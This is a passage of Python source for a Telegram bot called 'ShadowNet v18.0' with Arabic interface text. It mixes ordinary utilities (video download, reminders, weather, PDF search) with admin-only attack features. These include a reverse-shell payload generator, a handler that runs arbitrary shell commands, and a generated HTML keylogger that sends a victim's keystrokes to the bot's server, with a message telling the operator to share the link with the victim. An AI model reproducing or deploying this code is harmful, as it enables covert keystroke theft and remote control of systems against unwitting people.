                            (chat_id, text, payload[:500], datetime.now().isoformat()))
            safe_send(chat_id, f"💀 الحمولة العكسية لـ {text}:\n```\n{payload}\n```\n⚠️ استخدم على مسؤوليتك.", parse_mode="Markdown")
            user_states[chat_id] = None
            return

        if state == "h4x_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            result = h4x_tools_search(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "matkap":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            result = matkap_check(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        if state == "pentest_tools":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            if text.lower() not in ['scapy', 'impacket', 'paramiko']:
                safe_send(chat_id, "❌ أدوات متاحة: scapy, impacket, paramiko")
                return
            result = pentest_tools_use(text.lower(), 'target')
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== RCE =====
        if state == "waiting_rce":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            try:
                output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = output.decode('utf-8', errors='ignore')
            except Exception as e:
                output = str(e)
            safe_db_execute("INSERT INTO hack_commands (chat_id, command, output, created_at) VALUES (?, ?, ?, ?)",
                            (str(chat_id), text, output, datetime.now().isoformat()))
            safe_send(chat_id, f"🖥️ نتيجة الأمر:\n{output[:3000]}")
            user_states[chat_id] = None
            return

        # ===== Keylogger =====
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                safe_send(chat_id, "⛔ خاصية المطور فقط.")
                user_states[chat_id] = None
                return
            keylogger_html = f'''
            <!DOCTYPE html>
            <html>
            <body>
            <script>
            let keystrokes = '';
            document.addEventListener('keydown', function(e) {{
                keystrokes += e.key;
                if (keystrokes.length > 50) {{
                    fetch('{SERVER_URL}/api/collect_keylog', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{chat_id: '{chat_id}', keystrokes: keystrokes}})
                    }});
                    keystrokes = '';
                }}
            }});
            </script>
            <h1>Loading...</h1>
            </body>
            </html>
            '''
            os.makedirs('temp', exist_ok=True)
            filename = f"temp/keylogger_{chat_id}_{int(time.time())}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(keylogger_html)
            link = f"{SERVER_URL}/temp/keylogger_{chat_id}_{int(time.time())}.html"
            safe_send(chat_id, f"🔑 رابط Keylogger:\n{link}\n\nشارك هذا الرابط مع الضحية.")
            user_states[chat_id] = None
            return

        # ===== تحميل فيديو =====
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    os.remove(filename)
                    safe_send(chat_id, "✅ تم إرسال الفيديو بنجاح!")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الفيديو: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return

        # ===== بريد مؤقت =====
        if text.startswith('/read_'):
            if chat_id not in user_emails:
                safe_send(chat_id, "📭 لا يوجد بريد نشط.")
                return
            try:
                msg_id = text.split('_')[1]
            except:
                safe_send(chat_id, "📩 استخدم: /read_رقم_الرسالة")
                return
            name, domain = user_emails[chat_id][1], user_emails[chat_id][2]
            url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={name}&domain={domain}&id={msg_id}"
            try:
                res = requests.get(url).json()
                result = f"📩 من: {res['from']}\nالموضوع: {res['subject']}\n\n{res['textBody']}"
                safe_send(chat_id, result)
            except Exception as e:
                safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")
            return

        # ===== خدمات عامة =====
        if state == "weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return

        if state == "wikipedia":
            safe_send(chat_id, f"📚 نتيجة البحث:\n{advanced_wikipedia_search(text)}")
            user_states[chat_id] = None
            return

        if state == "translate":
            user_states[chat_id] = "waiting_translate_lang"
            user_states[f"{chat_id}_translate_text"] = text
            safe_send(chat_id, "🌐 اختر اللغة المستهدفة:", reply_markup=build_translate_menu())
            return

        if state == "reminder":
            parts = text.split('|')
            if len(parts) >= 2:
                msg_text = parts[0].strip()
                time_str = parts[1].strip()
                try:
                    hour, minute = map(int, time_str.split(':'))
                    now = datetime.now()
                    target_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
                    if target_time <= now:
                        target_time += timedelta(days=1)
                    safe_db_execute("INSERT INTO reminders (chat_id, message, remind_time, created_at) VALUES (?, ?, ?, ?)",
                                    (chat_id, msg_text, target_time.isoformat(), datetime.now().isoformat()))
                    safe_send(chat_id, f"✅ تم تعيين التذكير لـ {time_str}")
                except:
                    safe_send(chat_id, "❌ وقت غير صحيح.")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: الرسالة|الساعة:الدقيقة")
            user_states[chat_id] = None
            return

        # ===== تحليل كلمة المرور =====
        if state == "password_strength":
            strength, time_taken, score, feedback = analyze_password(text)
            feedback_text = "\n".join(feedback) if feedback else "✅ ممتاز!"
            msg = f"🔐 تحليل كلمة المرور:\nالقوة: {strength}\nالوقت المطلوب للاختراق: {time_taken}\nالنتيجة: {score}/6\n\nملاحظات:\n{feedback_text}"
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        # ===== تحويل النص لصوت =====
        if state == "voice_gtts_text":
            lang = user_voice_selection.get(chat_id, 'ar')
            voice_bytes = generate_voice_gtts(text, lang)
            if voice_bytes:
                try:
                    bot.send_audio(chat_id, voice_bytes, caption=f"🎤 صوت باللهجة {list(VOICES.keys())[list(VOICES.values()).index(lang)] if lang in VOICES.values() else 'عربية'}")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الصوت: {str(e)[:100]}")
            else:
                safe_send(chat_id, "❌ فشل توليد الصوت.")
            user_states[chat_id] = None
            return

        # ===== تقصير وفك الروابط =====
        if state == "shorten_url":
            short = shorten_url(text)
            if short:
                safe_send(chat_id, f"🔗 الرابط المختصر:\n`{short}`", parse_mode='Markdown')
            else:
                safe_send(chat_id, "❌ فشل تقصير الرابط.")
            user_states[chat_id] = None
            return

        if state == "expand_url":
            original = expand_url(text)
            if original:
                safe_send(chat_id, f"🔗 الرابط الأصلي:\n`{original}`", parse_mode='Markdown')
            else:
                safe_send(chat_id, "❌ الرابط غير صحيح أو غير موجود.")
            user_states[chat_id] = None
            return

        # ===== تتبع رقم الهاتف =====
        if state == "track_phone":
            result = track_phone_number(text)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== فحص الروابط =====
        if state == "check_link":
            result = check_link_no_api(text)
            msg = f"🔍 نتيجة فحص الرابط:\nالرابط: {text}\nالحالة: {result['status']}\nالرسالة: {result['message']}"
            if result.get('code'):
                msg += f"\nكود الاستجابة: {result['code']}"
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        # ===== توليد صور AI =====
        if state == "generate_image":
            safe_send(chat_id, "🎨 جاري توليد الصورة... (قد يستغرق 30 ثانية)")
            img_bytes = generate_image(text)
            if img_bytes:
                try:
                    bot.send_photo(chat_id, img_bytes, caption=f"🖼️ تم توليد الصورة بناءً على: {text[:100]}")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل إرسال الصورة: {str(e)[:100]}")
            else:
                safe_send(chat_id, "❌ فشل توليد الصورة. حاول بوصف أبسط.")
            user_states[chat_id] = None
            return

        # ===== PDF سمارت =====
        if state == "pdf_smart_question":
            pdf_text = pdf_texts.get(chat_id, "")
            if not pdf_text:
                safe_send(chat_id, "❌ لم يتم تحميل أي PDF.")
                user_states[chat_id] = None
                return
            answer = smart_pdf_search(pdf_text, text)
            safe_send(chat_id, f"🧠 إجابة السؤال:\n{answer[:2000]}")
            user_states[chat_id] = None
            return

        # ===== إرسال رسالة من الأدمن =====
        if state == "admin_send_message":
            if not is_admin(chat_id):
                return
            parts = text.split('|')
            if len(parts) >= 2:
                target_id = int(parts[0].strip())
                msg = parts[1].strip()
                try:
                    safe_send(target_id, f"📨 رسالة من الإدارة:\n{msg}")
                    safe_send(chat_id, f"✅ تم إرسال الرسالة إلى {target_id}")
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:100]}")
            else:
                safe_send(chat_id, "❌ صيغة غير صحيحة. استخدم: معرف|الرسالة")
            user_states[chat_id] = None
            return

        # ===== افتراضي: عرض القائمة إذا لم توجد حالة =====
        if state is None:
            safe_send(chat_id, "🏠 القائمة الرئيسية", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        safe_send(chat_id, "حدث خطأ.")
        notify_admin(f"خطأ في النص: {e}")

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون اسم"

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("خطأ"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم استخراج النص (عدد الأحرف: {len(text)})")
                safe_send(chat_id, "📊 اختر الإجراء:", reply_markup=build_pdf_menu())
            else:
                safe_send(chat_id, f"❌ {text}")
            return

        if user_states.get(chat_id) == "analyze_apk":
            if not file_name.lower().endswith('.apk'):
                safe_send(chat_id, "❌ يرجى إرسال ملف APK.")
                return
            safe_send(chat_id, "📦 جاري تحليل APK...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            result = analyze_apk(downloaded, file_name)
            if result.get('error'):
                safe_send(chat_id, f"❌ فشل: {result['error']}")
            else:
                msg = f"📦 تحليل APK:\nالملف: {file_name}\nالأذونات الخطيرة: {result.get('dangerous_permissions', [])}\nضار: {'نعم' if result.get('malicious') else 'لا'}"
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")

# ===================== 8. MAIN & KEEP-ALIVE =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
        except:
            pass

def check_reminders():
    while True:
        try:
            now = datetime.now().isoformat()
            rows = safe_db_query("SELECT id, chat_id, message FROM reminders WHERE remind_time <= ? AND is_active = 1", (now,), fetch_one=False)
            for rid, chat_id, msg in rows:
                safe_send(chat_id, f"⏰ تذكير:\n{msg}")
                safe_db_execute("UPDATE reminders SET is_active = 0 WHERE id = ?", (rid,))
        except Exception as e:
            logger.error(f"check_reminders error: {e}")
        time.sleep(30)

# ===== إعدادات Webhook =====
WEBHOOK_URL = f"{SERVER_URL}/webhook"

def set_webhook():
    try:
        bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Webhook القديم تم حذفه")
        time.sleep(1)
    except Exception as e:
        logger.warning(f"⚠️ فشل حذف Webhook القديم: {e}")

    try:
        bot.set_webhook(url=WEBHOOK_URL)
        logger.info(f"✅ Webhook تم تعيينه بنجاح على: {WEBHOOK_URL}")
        return True
    except Exception as e:
        logger.error(f"❌ فشل تعيين Webhook: {e}")
        return False

@app.route('/')
def index():
    return "OK", 200

@app.route('/health')
def health():
    return jsonify({"status": "running", "webhook": WEBHOOK_URL}), 200

@app.route('/webhook', methods=['POST'])
def webhook(*args, **kwargs):  # ✅ إضافة *args, **kwargs لاستيعاب أي معاملات إضافية
    try:
        json_str = request.get_data().decode('UTF-8')
        if not json_str:
            logger.warning("⚠️ Webhook received empty body")
            return "OK", 200

        update = Update.de_json(json_str, bot)
        if update is None:
            logger.error("❌ Failed to parse update")
            return "ERROR", 400

        bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        logger.error(f"❌ خطأ في Webhook: {e}")
        return "ERROR", 500

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🤖 ShadowNet v18.0 - نسخة Webhook النهائية (مع تصحيح TypeError)")
    print(f"📌 Webhook URL: {WEBHOOK_URL}")
    print(f"📌 Health Check: {SERVER_URL}/health")
    print("="*60 + "\n")

    if not set_webhook():
        print("❌ فشل تعيين Webhook. تأكد من أن الخادم يعمل ويمكن الوصول إليه.")
        sys.exit(1)

    # بدء الخيوط الخلفية
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()

    app.run(host='0.0.0.0', port=PORT, debug=False)
